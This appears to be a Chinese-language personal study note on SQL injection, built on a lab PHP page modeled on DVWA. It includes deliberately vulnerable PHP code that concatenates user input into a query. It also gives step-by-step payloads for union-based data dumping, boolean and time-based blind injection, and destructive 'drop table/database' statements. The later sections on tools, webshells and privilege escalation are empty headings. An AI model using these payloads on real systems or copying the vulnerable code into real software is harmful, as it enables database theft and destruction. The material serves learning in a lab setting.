> 复习下SQL注入的知识点，希望有所提高。
# 0x00 前言
> 注入攻击的本质，是吧用户输入的数据当作代码执行，这里有两个关键条件，第一个是用户能控制输入；第二个是原本程序要执行的代码，拼接了用户输入的数据。"数据与代码分离"的原则可以说是专门为了解决输入攻击而生的。  --《白帽子讲web安全》

# 0x01 分类
1. 有报错或者内容回显
    - union注入等查询性质的
    - 直接添加一条执行性质的SQL语句注入等执行性质的 例如 `id=1';drop table test --`  
    > 这是一段DVWA上面输入low难度改编的源码，没有关闭报错，并有显示数据查询结果回显。
    ```
    //数据库：
    //create database sqltest;
    //use sqltest
    //create table users(id int, first_name varchar(20), last_name varchar(20) );
    //insert into users values(1,'admin','adminhaha');
    //insert into users values(2,'root','roothaha');
    /****************************************************************************/
    <?php
	if( isset( $_REQUEST[ 'Submit' ] ) ) {
		// Get input
		$id = $_REQUEST[ 'id' ];
	
		// Check database
		$query  = "SELECT first_name, last_name FROM users WHERE id = '$id';";
        //echo $query; //查看sql
		$mysql = mysqli_connect('localhost','root','********','sqltest',3306) or die('<script language="javascript"> alert("数据库繁忙");</script>  ');
		$result = mysqli_query($mysql,  $query );
		// Get results
		$html = '';
		while( $row = mysqli_fetch_assoc( $result ) ) {
			// Get values
			$first = $row["first_name"];
			$last  = $row["last_name"];
	
			// Feedback for end user
			$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
		}
	
	}	
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>SQL注入基础测试</title>
    </head>
    <body>
        <form action="index.php" method="GET">
            ID:<input type="text" Name="id">  
	        <input type="Submit" Name="Submit">
	    </form>
    <?php echo $html;?>
    </body>
    </html>
    ```
    > 这段代码除了添加单引号闭合之外没有其他的防注入的手段，加上没有关闭报错，单引号闭合就会很容易的被发现，大致注入过程如下
    ```
    index.php?Submit&id='
    //单引号出现异常，因为引号未闭合，mysql查询的时候报出异常，使mysqli_fetch_assoc()的参数$result出现问题 
    index.php?Submit&id="
    //双引号没有异常，说明采用单引号闭合

    1' and 2=1 --%20
    1' and 1=1 --%20
    1' or '1'='2
    -1' or 1=1 #
    //这些都是测试是否是注入点，注意两个横线后面有一个空格（%20）确认注入点后，理论上需要判断一些过滤规则，寻找一些可利用的函数或者关键字等。然后这里就跳过了。

    1' order by 1 #         //正常
    1' order by 2 #         //正常
    1' order by 3 #         //报错
    1' union select 1 #     //报错
    1' union select 1,1 #   //正常
    1' union select 1,1,1 # //报错
    //这个是查询当前的sql语句一共查询了几个字段。结论是两个，用了两个知识点，
    //一个是order by +数字，这个字句表示按照第几个查询的字段排序，因为只查询了两个字段，所以数字为3的时候报错，
    //第二个知识点是union查询前后查询字段数目必须一样前面查询了两个字段后面就一定要查询两个字段，否则就会报错

    -1' union select version(),database() #  //数据库软件版本  当前数据库名
    -1' union select @@version_compile_os,@@basedir #  系统信息，数据库所在目录
    ……
    //信息收集过程，相关的SQL函数和方法还有很多，@@datadir、@@temdir，user()、system_user()、current_user()session_user()等等，这个过程主要是摸清数据库的一些信息，然后根据数据库版本和类型之类的信息进行进一步的渗透。
    //比如经过上面的测试，这个数据库是MySQL数据库，版本是5.7.14。运行在Windows 64位系统上，那么进一步注入的思路就是利用Mysql5.0以上自带数据库：information_schema，这个数据库存储mysql下所有信息的数据库（数据库名，表名，列名）

    -1' union select group_concat(schema_name),system_user() from information_schema.schemata #
    //得到所有数据库名group_concat() 函数是将查询结果合并成一行

    -1' union select group_concat(table_name),1 from information_schema.tables where table_schema='sqltest
    //查询sqltest库下的表名，注意这里因为sqltest是一个字符串因此有两种写法：一种是闭合引号就像这个例子这样，还有就是采用16进制形式形如0x222a2d2d这种，不加引号，但是要加上#或者--（空格 or %20）注释掉后面的引号。

    -1' union select group_concat(column_name),1 from information_schema.columns where table_name='users' and table_schema='sqltest
    //利用得到的表名继续深入查询列名

    -1' union select first_name,last_name from users #
    //得到目标表中的所有数据，以上就是最最基础的联合注入过程。

    -1';drop database aaa #
    //然而这个实验中并不能执行这个操做，但是这个操做是确实存在的，
    ```
    > 感觉这个篇幅有点长了，说的有点啰里啰唆。先就到这吧。
2. 盲注
    - 基于报错的盲注
    > 还是使用上面的代码，但是这次输出$html的时候直接改成`<?php echo $html==''?'no':'yes'; ?>`（ 会稍微有点警告，可以在最上面加上`$html='';`,或者`error_reporting(0);`）然后就是一个简单的基于报错的注入了，报错注入基本原理就是利用在正常的一个参数后面and一个等式或者函数，等式成立或者函数返回真就会返回正常的页面，不成立就会返回错误或者是查询为空。这个要熟悉sql语言中的字符串操作的函数和子句，因为大多数时候报错注入手注的话都是把字符串切割成一个一个的字符猜解。MySQL常见函数可以参考[MySQL 函数 | 菜鸟教程](http://www.runoob.com/mysql/mysql-functions.html)，其他关系型数据库函数大体相同。然后还是放上这个系统注入过程
    ```
    //基于报错
    //测试注入点，和上面基本差不多，
    //查询要查询的信息的长度 length() 返回字符串长度，需要从1开始试，一直试到7，返回正确
    1' and length(database())=7 #

    //一个一个字符测试,ascii()函数返回一个字符的ascii码，substr(s,start,length)从字符串 s 的 start（从1开始） 位置截取长度为 length 的子字符串，然后还是一个一个ascii码试直到返回正确，然后测试下一个字符，直到得到整个字符串
    1' and ascii(substr(database(),1,1))=114 #

    //然后还是老套路利用MySQL的information_schema查库->查表->查列明，然后查询字段,limit子句：limit start,length 从start（从0开始）开始截取length行
    1' and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105 #

    //以上大概就是一个针对MySQL5版本的一个基于报错的盲注的大致过程然后可以配合各种运算符进行运算
    ```
    
    - 基于时间的盲注
    > 主要是利用一些可以拖延时间的函数和if()配合，实现如果条件正确，就延时返回，如果正确就快速返回.
    ```
    //先修改上面的代码删除上面添加的<?php echo $html==''?'no':'yes'; ?>。
    //判断注入点，这次就不能使用上面的方法判断注入点了，使用sleep然后注意观察网页返回时间如果网页比正常卡顿说明存在注入点，不过感觉这种应该会影响服务器性能，一般会禁掉sleep吧，然后类似的函数还有benchmark(count,expr)将expr执行count次，expr可以选一些解码什么函数
    1' and sleep(100) #

    //开始注入，构造if语句
    1' and if(1=2,sleep(10),'a')=char(97) #
    //然后剩下的就是和刚才的基于报错的盲注一样，再1=2那里一步一步的注入就行了
    ```
# 0x02 工具
> 要说sql注入最著名的工具就一定是sqlmap了，这个工具你--help可能觉得没什么，但是你-hh就会发现这个工具的厉害之处，这个文档可以长到超过百度翻译5000字字数限制(我也不知道这个是怎么算的)
![超过字数限制](https://i.loli.net/2019/03/25/5c9875a64452c.png)

- 编码工具















# 0x02 注入技巧及常见注意事项
> 这个标题有点重，各种针对数据库，针对各种函数绕过的奇淫技巧数不胜数，各种利用方式也数不胜数，其中要注意的点也有很多
- 写入木马
- 提权
[SqlMap](https://github.com/sqlmapproject/sqlmap/wiki/Features)
[nosql数据库注入](https://www.anquanke.com/post/id/97211)
[SQL注入由浅入深](https://zhuanlan.zhihu.com/p/23569276)
